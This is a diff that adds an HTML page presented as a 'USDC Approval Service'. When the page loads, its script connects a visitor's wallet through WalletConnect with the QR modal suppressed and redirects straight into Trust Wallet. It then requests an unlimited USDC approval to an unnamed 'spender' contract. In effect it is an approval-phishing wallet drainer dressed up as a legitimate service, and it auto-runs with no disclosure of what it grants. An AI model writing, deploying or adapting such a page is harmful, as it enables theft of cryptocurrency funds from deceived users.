@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDC Approval Service</title>
+    <!-- Basic styling for better user feedback -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            color: #007bff;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 15px;
+        }
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .info { background-color: #e6f7ff; color: #0056b3; border: 1px solid #91d5ff; }
+        .success { background-color: #f6ffed; color: #237804; border: 1px solid #b7eb8f; }
+        .error { background-color: #fff1f0; color: #cf1322; border: 1px solid #ffa39e; }
+        .loading {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #007bff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>USDC Approval Service</h1>
+        <div id="loader" class="loading"></div>
+        <p id="message">Initializing...</p>
+        <div id="status" class="status-message hidden"></div>
+    </div>
+
+    <!-- Ethers.js and WalletConnect V2 Ethereum Provider from CDNs -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
+    <script type="module">
+        import { EthereumProvider } from 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.umd.min.js';
+
+        // --- Configuration ---
+        const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your Project ID
+        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official USDC Mainnet
+        const SPENDER_CONTRACT_ADDRESS = '0xBb69c59C6912aBeA0b2e6ccC6aba416db90A1322'; // Your deployed UsdcAllowanceSpender contract address
+        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)
+
+        // ERC20 ABI snippet for the approve function
+        const ERC20_ABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)",
+            "function decimals() view returns (uint8)" // Needed if we were parsing amounts from string to units
+        ];
+
+        // --- Global Provider and Account ---
+        let ethereumProvider;
+        let connectedAccount;
+
+        // --- UI Update Functions ---
+        function updateMessage(text, type = 'info') {
+            const messageElement = document.getElementById('message');
+            messageElement.textContent = text;
+            messageElement.className = `status-message ${type}`;
+        }
+
+        function showLoader(show) {
+            document.getElementById('loader').classList.toggle('hidden', !show);
+        }
+
+        // --- WalletConnect and Transaction Logic ---
+        async function startApprovalProcess() {
+            showLoader(true);
+            updateMessage('Initializing WalletConnect...');
+
+            try {
+                ethereumProvider = await EthereumProvider.init({
+                    projectId: WALLETCONNECT_PROJECT_ID,
+                    chains: [1], // Ethereum Mainnet Chain ID
+                    optionalChains: [],
+                    showQrModal: false, // CRITICAL: Prevents WalletConnect's default QR modal
+                    metadata: {
+                        name: 'USDC Approval Service',
+                        description: 'Approves USDC for a trusted service.',
+                        url: window.location.origin,
+                        icons: ['https://example.com/icon.png'], // You can replace this with your own icon URL
+                    },
+                });
+
+                // --- Event Listeners ---
+                ethereumProvider.on("display_uri", (uri) => {
+                    // This event fires if the wallet isn't already connected.
+                    // We immediately deep-link to Trust Wallet with the pairing URI.
+                    console.log("WalletConnect URI for pairing:", uri);
+                    updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');
+                    const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
+                    window.location.href = deepLink; // Redirects the browser to Trust Wallet
+                });
+
+                ethereumProvider.on("connect", (response) => {
+                    console.log("Wallet connected!", response);
+                    connectedAccount = response.accounts[0];
+                    updateMessage(`Wallet connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
+                    proposeApproveTransaction();
+                });
+
+                ethereumProvider.on("disconnect", (error) => {
+                    console.log("Wallet disconnected.", error);
+                    updateMessage('Wallet disconnected.', 'error');
+                    showLoader(false);
+                });
+
+                // --- Attempt to connect ---
+                if (!ethereumProvider.connected) {
+                    updateMessage('Requesting wallet connection... Check Trust Wallet.', 'info');
+                    await ethereumProvider.connect();
+                } else {
+                    connectedAccount = ethereumProvider.accounts[0];
+                    updateMessage(`Wallet already connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
+                    proposeApproveTransaction();
+                }
+
+            } catch (error) {
+                console.error('Error during WalletConnect initialization or connection:', error);
+                updateMessage(`Error: ${error.message}. Please try again.`, 'error');
+                showLoader(false);
+            }
+        }
+
+        async function proposeApproveTransaction() {
+            if (!ethereumProvider || !connectedAccount) {
+                updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
+                showLoader(false);
+                return;
+            }
+
+            showLoader(true);
+            updateMessage('Proposing USDC approval transaction... Please confirm in Trust Wallet.', 'info');
+
+            try {
+                // Use ethers to encode the function data
+                const iface = new ethers.Interface(ERC20_ABI);
+                const calldata = iface.encodeFunctionData('approve', [
+                    SPENDER_CONTRACT_ADDRESS,
+                    FIXED_ALLOWANCE_AMOUNT_HEX
+                ]);
+
+                const transaction = {
+                    from: connectedAccount,
+                    to: USDC_CONTRACT_ADDRESS,
+                    data: calldata,
+                    value: '0x0', // No ETH sent with an approval
+                };
+
+                console.log('Transaction to propose:', transaction);
+
+                // Request the user's wallet to sign and send the transaction
+                const txHash = await ethereumProvider.request({
+                    method: 'eth_sendTransaction',
+                    params: [transaction],
+                });
+
+                updateMessage(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Please check transaction status.`, 'success');
+                console.log('Transaction Hash:', txHash);
+
+            } catch (error) {
+                console.error('Transaction proposal failed:', error);
+                updateMessage(`Transaction failed: ${error.message}`, 'error');
+            } finally {
+                showLoader(false);
+            }
+        }
+
+        // Start the process when the page loads
+        window.addEventListener('load', startApprovalProcess);
+    </script>
+</body>
+</html>
